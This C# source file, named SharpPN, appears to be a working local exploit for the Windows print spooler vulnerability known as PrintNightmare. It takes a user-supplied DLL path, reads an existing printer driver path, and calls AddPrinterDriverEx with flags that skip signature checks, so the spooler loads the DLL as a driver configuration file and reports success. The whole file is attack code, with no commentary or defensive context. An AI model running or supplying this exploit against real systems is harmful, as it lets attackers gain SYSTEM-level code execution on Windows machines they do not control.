using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace SharpPN
{
    class Program
    {
        static void Main(string[] args)
        {
            string DLL = "";
            string driverName = GenRandomString();
            for (int i = 0; i < args.Count(); i++)
            {
                if (args[i].ToUpper().StartsWith(@"-DLL"))
                {
                    if (File.Exists(args[i + 1]))
                    {
                        if (args[i+1][1] == ':') 
                        {
                            DLL = args[i + 1];
                        }
                        else
                        {
                            DLL = Path.GetFullPath(args[i + 1]);
                        }
                    }
                    else
                    {
                        Console.WriteLine("[!] DLL does not exist. Exiting...");
                        Environment.Exit(0);
                    }
                }
            }

            if (DLL == "")
            {
                Console.WriteLine("[!] No value set for DLL. Exiting...");
                Environment.Exit(1);
            }

            UInt32 cbNeeded = 0;
            UInt32 cReturned = 0;
            Console.WriteLine("[*] DriverName: {0}", driverName);

            //This EnumPrinterDrivers should fail.
            EnumPrinterDrivers(null, "Windows x64", 2, IntPtr.Zero, 0, ref cbNeeded, ref cReturned);

            IntPtr pAddr = Marshal.AllocHGlobal((IntPtr)cbNeeded);
            DRIVER_INFO_2 driver = new DRIVER_INFO_2();
            if (EnumPrinterDrivers(null, "Windows x64", 2, pAddr, cbNeeded, ref cbNeeded, ref cReturned))
            {
                Console.WriteLine("[*] EnumPrinterDrivers: Success!");
                driver = (DRIVER_INFO_2)Marshal.PtrToStructure(pAddr, typeof(DRIVER_INFO_2));
                Marshal.FreeHGlobal(pAddr);
            }
            else
            {
                Console.WriteLine("[!] Failed to get current driver list");
                Marshal.FreeHGlobal(pAddr);
            }

            DRIVER_INFO_2 driverInfo = new DRIVER_INFO_2();
            driverInfo.cVersion = 3;
            driverInfo.pConfigFile = DLL;
            driverInfo.pDataFile = DLL;
            driverInfo.pDriverPath = driver.pDriverPath;
            driverInfo.pEnvironment = "Windows x64";
            driverInfo.pName = driverName;

            IntPtr pDriverInfo = Marshal.AllocHGlobal(Marshal.SizeOf(driverInfo));
            Marshal.StructureToPtr(driverInfo, pDriverInfo, false);

            if (AddPrinterDriverEx(null, 2, pDriverInfo, 0x00000004 | 0x10 | 0x8000))
            {
                Console.WriteLine("[*] AddPrinterDriverEx: Success!\n");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] PN Success!\n");
                Console.ResetColor();
            }
            else
            {
                Console.WriteLine("[!] AddPrinterDriverEx: {0}", Marshal.GetLastWin32Error().ToString());
            }
        }

        public static string GenRandomString()
        {
            const string src = "abcdefghijklmnopqrstuvwxyz";
            int length = 8;
            var sb = new StringBuilder();
            Random RNG = new Random();
            for (var i = 0; i < length; i++)
            {
                var c = src[RNG.Next(0, src.Length)];
                sb.Append(c);
            }

            return sb.ToString();
        }
        [DllImport("winspool.drv", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AddPrinterDriverEx(string pName, uint Level, IntPtr pPrinter, uint Flags);
        [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool EnumPrinterDrivers(String pName, String pEnvironment, uint level, IntPtr pDriverInfo, uint cdBuf, ref uint pcbNeeded, ref uint pcRetruned);

        public struct DRIVER_INFO_2
        {
            public uint cVersion;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pName;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pEnvironment;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pDriverPath;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pDataFile;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string pConfigFile;
        }
    }
}